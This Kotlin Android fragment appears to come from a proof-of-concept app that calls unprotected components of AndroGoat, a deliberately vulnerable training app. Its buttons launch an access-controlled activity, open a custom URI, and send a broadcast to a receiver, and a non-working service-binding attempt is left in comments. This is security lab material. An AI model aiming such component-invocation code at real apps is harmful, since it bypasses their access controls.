package com.example.androgoatpoc.ui.uac

import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.net.Uri
import android.os.Bundle
import android.os.IBinder
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import android.widget.Toast
import androidx.fragment.app.Fragment
import androidx.lifecycle.ViewModelProvider
import com.example.androgoatpoc.databinding.FragmentUacBinding

class UnprotectedAndroidComponentsFragment : Fragment(){

    private var _binding: FragmentUacBinding? = null

    // This property is only valid between onCreateView and
    // onDestroyView.
    private val binding get() = _binding!!

    private var service: Any? = null

    // Don't work. Should I delete this code?
    /*
    private val connection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
            this@UnprotectedAndroidComponentsFragment.service = service
        }

        override fun onServiceDisconnected(name: ComponentName?) {
            this@UnprotectedAndroidComponentsFragment.service = null
        }
    }*/



    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        val homeViewModel =
            ViewModelProvider(this).get(HomeViewModel::class.java)

        _binding = FragmentUacBinding.inflate(inflater, container, false)
        val root: View = binding.root

        val textView: TextView = binding.textHome
        homeViewModel.text.observe(viewLifecycleOwner) {
            textView.text = it
        }



        return root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        binding.buttonLaunchActivity.setOnClickListener {

            val intent = Intent(Intent.ACTION_VIEW)
            intent.setPackage("owasp.sat.agoat")
            intent.setClassName("owasp.sat.agoat", "owasp.sat.agoat.AccessControl1ViewActivity")

            Toast.makeText(requireContext(), "Calling the Activity: 'owasp.sat.agoat.AccessControl1ViewActivity'", Toast.LENGTH_LONG).show()
            startActivity(intent)
        }

        binding.buttonCustomUrl.setOnClickListener {

            val intent = Intent(Intent.ACTION_VIEW)
            intent.setPackage("owasp.sat.agoat")
            intent.data = Uri.parse("androgoat://vulnapp")

            Toast.makeText(requireContext(), "Calling the Uri: 'androgoat://vulnapp'", Toast.LENGTH_LONG).show()
            startActivity(intent)
        }

        // Disabled -> Seems the AndroGoat's download service is not working when it's called by 3rd party apps
        // I think it's because of the lack of proper binding implementation (please correct me if I'm wrong lol)
        // https://github.com/satishpatnayak/AndroGoat/blob/1f383989bf8435ba8aea245439e1b7f68f2f985d/app/src/main/java/owasp/sat/agoat/DownloadInvoiceService.kt#L27
        binding.buttonDownloadInvoice.isEnabled = false
        binding.buttonDownloadInvoice.setOnClickListener {

            Toast.makeText(requireContext(), "Button not implemented yet :(", Toast.LENGTH_LONG).show()
            /*
            // Create an intent to start the service
            //var intent = Intent()
           // intent.component = ComponentName("owasp.sat.agoat", "owasp.sat.agoat.DownloadInvoiceService")
            //intent.component = ComponentName("owasp.sat.agoat", "owasp.sat.agoat.DownloadInvoiceService")
           // startService(intent)

            //val intent = Intent(context, DownloadInvoiceService::class.java)
            //val intent = Intent("owasp.sat.agoat", "owasp.sat.agoat.DownloadInvoiceService")
            //val intent = Intent()
            //intent.component = ComponentName("owasp.sat.agoat", "owasp.sat.agoat.DownloadInvoiceService")
            //context?.startForegroundService(intent)


            // Bind to the service
            bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE)

            // Unbind from the service when you are finished
            unbindService(serviceConnection)

            val intent = Intent()
            intent.component = ComponentName("owasp.sat.agoat", "owasp.sat.agoat.DownloadInvoiceService")
            bindService(intent, connection, Context.BIND_AUTO_CREATE)

             */
        }

        binding.buttonReceiver.setOnClickListener {
            val intent = Intent()
            intent.setPackage("owasp.sat.agoat")
            intent.setClassName("owasp.sat.agoat", "owasp.sat.agoat.ShowDataReceiver")
            requireContext().sendBroadcast(intent)
        }
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}